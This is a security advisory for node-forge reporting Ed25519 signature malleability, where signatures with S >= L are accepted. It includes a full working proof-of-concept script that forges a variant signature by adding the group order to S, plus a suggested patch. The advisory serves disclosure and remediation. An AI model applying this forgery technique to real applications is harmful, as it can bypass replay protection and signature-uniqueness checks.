# [H] Forge has signature forgery in Ed25519 due to missing S > L check

## Summary
Severity: High
Advisory: GHSA-q67f-28xg-22rw
CVE: CVE-2026-33895
CWE: CWE-347
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-q67f-28xg-22rw
Type: github-advisory

## Affected
- npm: `node-forge` — affected >=0 <1.4.0

## Details
## Summary
Ed25519 signature verification accepts forged non-canonical signatures where the scalar S is not reduced modulo the group order (`S >= L`). A valid signature and its `S + L` variant both verify in forge, while Node.js `crypto.verify` (OpenSSL-backed) rejects the `S + L` variant, [as defined by the specification](https://datatracker.ietf.org/doc/html/rfc8032#section-8.4). This class of signature malleability has been exploited in practice to bypass authentication and authorization logic (see [CVE-2026-25793](https://nvd.nist.gov/vuln/detail/CVE-2026-25793), [CVE-2022-35961](https://nvd.nist.gov/vuln/detail/CVE-2022-35961)). Applications relying on signature uniqueness (i.e., dedup by signature bytes, replay tracking, signed-object canonicalization checks) may be bypassed.

## Impacted Deployments
**Tested commit:** `8e1d527fe8ec2670499068db783172d4fb9012e5`
**Affected versions:** tested on v1.3.3 (latest release) and all versions since Ed25519 was implemented.

**Configuration assumptions:**
- Default forge Ed25519 verify API path (`ed25519.verify(...)`).


## Root Cause
In `lib/ed25519.js`, `crypto_sign_open(...)` uses the signature's last 32 bytes (`S`) directly in scalar multiplication:

```javascript
scalarbase(q, sm.subarray(32));
```

There is no prior check enforcing `S < L` (Ed25519 group order). As a result, equivalent scalar classes can pass verification, including a modified signature where `S := S + L (mod 2^256)` when that value remains non-canonical. The PoC demonstrates this by mutating only the S half of a valid 64-byte signature.

## Reproduction Steps
- Use Node.js (tested with `v24.9.0`) and clone `digitalbazaar/forge` at commit `8e1d527fe8ec2670499068db783172d4fb9012e5`.
- Place and run the PoC script (`poc.js`) with `node poc.js` in the same level as the `forge` folder.
- The script generates an Ed25519 keypair via forge, signs a fixed message, mutates the signature by adding Ed25519 order L to S (bytes 32..63), and verifies both original and tweaked signatures with forge and Node/OpenSSL (`crypto.verify`).
- Confirm output includes:

```json
{
	"forge": {
		"original_valid": true,
		"tweaked_valid": true
	},
	"crypto": {
		"original_valid": true,
		"tweaked_valid": false
	}
}
```

## Proof of Concept

**Overview:**
- Demonstrates a valid control signature and a forged (S + L) signature in one run.
- Uses Node/OpenSSL as a differential verification baseline.
- Observed output on tested commit:

```text
{
    "forge": {
        "original_valid": true,
        "tweaked_valid": true
    },
    "crypto": {
        "original_valid": true,
        "tweaked_valid": false
    }
}
```

<details><summary>poc.js</summary>

```javascript
#!/usr/bin/env node
'use strict';

const path = require('path');
const crypto = require('crypto');
const forge = require('./forge');
const ed = forge.ed25519;

const MESSAGE = Buffer.from('dderpym is the coolest man alive!');

// Ed25519 group order L encoded as 32 bytes, little-endian (RFC 8032).
const ED25519_ORDER_L = Buffer.from([
  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
]);

// For Ed25519 signatures, s is the last 32 bytes of the 64-byte signature.
// This returns a new signature with s := s + L (mod 2^256), plus the carry.
function addLToS(signature) {
  if (!Buffer.isBuffer(signature) || signature.length !== 64) {
    throw new Error('signature must be a 64-byte Buffer');
  }
  const out = Buffer.from(signature);
  let carry = 0;
  for (let i = 0; i < 32; i++) {
    const idx = 32 + i; // s starts at byte 32 in the 64-byte signature.
    const sum = out[idx] + ED25519_ORDER_L[i] + carry;
    out[idx] = sum & 0xff;
    carry = sum >> 8;
  }
  return { sig: out, carry };
}

function toSpkiPem(publicKeyBytes) {
  if (publicKeyBytes.length !== 32) {
    throw new Error('publicKeyBytes must be 32 bytes');
  }
  // Builds an ASN.1 SubjectPublicKeyInfo for Ed25519 (RFC 8410) and returns PEM.
  const oidEd25519 = Buffer.from([0x06, 0x03, 0x2b, 0x65, 0x70]);
  const algId = Buffer.concat([Buffer.from([0x30, 0x05]), oidEd25519]);
  const bitString = Buffer.concat([Buffer.from([0x03, 0x21, 0x00]), publicKeyBytes]);
  const spki = Buffer.concat([Buffer.from([0x30, 0x2a]), algId, bitString]);
  const b64 = spki.toString('base64').match(/.{1,64}/g).join('\n');
  return `-----BEGIN PUBLIC KEY-----\n${b64}\n-----END PUBLIC KEY-----\n`;
}

function verifyWithCrypto(publicKey, message, signature) {
  try {
    const keyObject = crypto.createPublicKey(toSpkiPem(publicKey));
    const ok = crypto.verify(null, message, keyObject, signature);
    return { ok };
  } catch (error) {
    return { ok: false, error: error.message };
  }
}

function toResult(label, original, tweaked) {
  return {
    [label]: {
      original_valid: original.ok,
      tweaked_valid: tweaked.ok,
    },
  };
}

function main() {
  const kp = ed.generateKeyPair();
  const sig = ed.sign({ message: MESSAGE, privateKey: kp.privateKey });
  const ok = ed.verify({ message: MESSAGE, signature: sig, publicKey: kp.publicKey });
  const tweaked = addLToS(sig);
  const okTweaked = ed.verify({
    message: MESSAGE,
    signature: tweaked.sig,
    publicKey: kp.publicKey,
  });
  const cryptoOriginal = verifyWithCrypto(kp.publicKey, MESSAGE, sig);
  const cryptoTweaked = verifyWithCrypto(kp.publicKey, MESSAGE, tweaked.sig);
  const result = {
    ...toResult('forge', { ok }, { ok: okTweaked }),
    ...toResult('crypto', cryptoOriginal, cryptoTweaked),
  };
  console.log(JSON.stringify(result, null, 2));
}

main();
```
</details>

## Suggested Patch
Add strict canonical scalar validation in Ed25519 verify path before scalar multiplication. (Parse S as little-endian 32-byte integer and reject if `S >= L`).

Here is a patch we tested on our end to resolve the issue, though please verify it on your end:

```diff
index f3e6faa..87eb709 100644
--- a/lib/ed25519.js
+++ b/lib/ed25519.js
@@ -380,6 +380,10 @@ function crypto_sign_open(m, sm, n, pk) {
     return -1;
   }

+  if(!_isCanonicalSignatureScalar(sm, 32)) {
+    return -1;
+  }
+
   for(i = 0; i < n; ++i) {
     m[i] = sm[i];
   }
@@ -409,6 +413,21 @@ function crypto_sign_open(m, sm, n, pk) {
   return mlen;
 }

+function _isCanonicalSignatureScalar(bytes, offset) {
+  var i;
+  // Compare little-endian scalar S against group order L and require S < L.
+  for(i = 31; i >= 0; --i) {
+    if(bytes[offset + i] < L[i]) {
+      return true;
+    }
+    if(bytes[offset + i] > L[i]) {
+      return false;
+    }
+  }
+  // S == L is non-canonical.
+  return false;
+}
+
 function modL(r, x) {
   var carry, i, j, k;
   for(i = 63; i >= 32; --i) {
```

## Resources

- RFC 8032 (Ed25519): https://datatracker.ietf.org/doc/html/rfc8032#section-8.4
  - > Ed25519 and Ed448 signatures are not malleable due to the verification check that decoded S is smaller than l


## Credit

This vulnerability was discovered as part of a U.C. Berkeley security research project by: Austin Chu, Sohee Kim, and Corban Villa.

## References
- https://github.com/digitalbazaar/forge/security/advisories/GHSA-q67f-28xg-22rw
- https://nvd.nist.gov/vuln/detail/CVE-2022-35961
- https://nvd.nist.gov/vuln/detail/CVE-2026-25793
- https://nvd.nist.gov/vuln/detail/CVE-2026-33895
- https://github.com/digitalbazaar/forge/commit/bdecf11571c9f1a487cc0fe72fe78ff6dfa96b85
- https://datatracker.ietf.org/doc/html/rfc8032#section-8.4
- https://github.com/digitalbazaar/forge
